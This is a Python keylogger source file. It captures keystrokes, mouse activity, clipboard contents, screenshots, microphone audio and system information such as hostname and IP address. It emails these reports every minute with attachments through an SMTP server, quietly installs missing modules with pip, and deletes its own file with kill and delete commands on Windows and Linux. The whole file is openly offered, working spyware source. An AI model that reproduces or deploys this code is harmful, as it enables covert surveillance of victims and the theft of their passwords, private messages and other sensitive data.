try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    import pyperclip
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
    import time
    import tempfile  # Import tempfile to get a temporary directory
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput", "pyperclip"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS = "YOUR_USERNAME"
    EMAIL_PASSWORD = "YOUR_PASSWORD"
    SEND_REPORT_EVERY = 60  # as in seconds

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log += string

        def on_move(self, x, y):
            current_move = "Mouse moved to {} {}\n".format(x, y)
            self.appendlog(current_move)

        def on_click(self, x, y, button, pressed):
            current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
            self.appendlog(current_click)

        def on_scroll(self, x, y, dx, dy):
            current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key + "\n")

        def send_mail(self, email, password, message, attachment_path=None):
            try:
                msg = MIMEMultipart()
                msg['From'] = email
                msg['To'] = email
                msg['Subject'] = "Keylogger Report"

                msg.attach(MIMEText(message, 'plain'))

                if attachment_path and os.path.exists(attachment_path):
                    with open(attachment_path, "rb") as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                        msg.attach(part)

                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                    server.login(email, password)
                    server.sendmail(email, email, msg.as_string())
            except Exception as e:
                logging.error(f"Failed to send email: {e}")
                os._exit(1)

        def report(self):
            self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
            screenshot_path = self.screenshot()
            self.send_mail(self.email, self.password, "\n\n" + self.log, screenshot_path)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

        def get_clipboard_content(self, max_retries=5):
            for i in range(max_retries):
                try:
                    return pyperclip.paste()
                except pyperclip.PyperclipException as e:
                    self.appendlog(f"Error accessing clipboard (attempt {i+1}): {e}\n")
                    time.sleep(1)  # Wait a bit before retrying
            return "Could not access clipboard"

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog("Hostname: {}\n".format(hostname))
            self.appendlog("IP Address: {}\n".format(ip))
            self.appendlog("Processor: {}\n".format(plat))
            self.appendlog("System: {}\n".format(system))
            self.appendlog("Machine: {}\n".format(machine))

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            obj.writeframesraw(myrecording)

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        def screenshot(self):
            try:
                img = pyscreenshot.grab()
                # Save screenshot in the user's temporary directory
                temp_dir = tempfile.gettempdir()
                screenshot_path = os.path.join(temp_dir, "screenshot.png")
                img.save(screenshot_path)
                return screenshot_path
            except Exception as e:
                self.appendlog("Failed to take screenshot: {}\n".format(e))
                return None

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
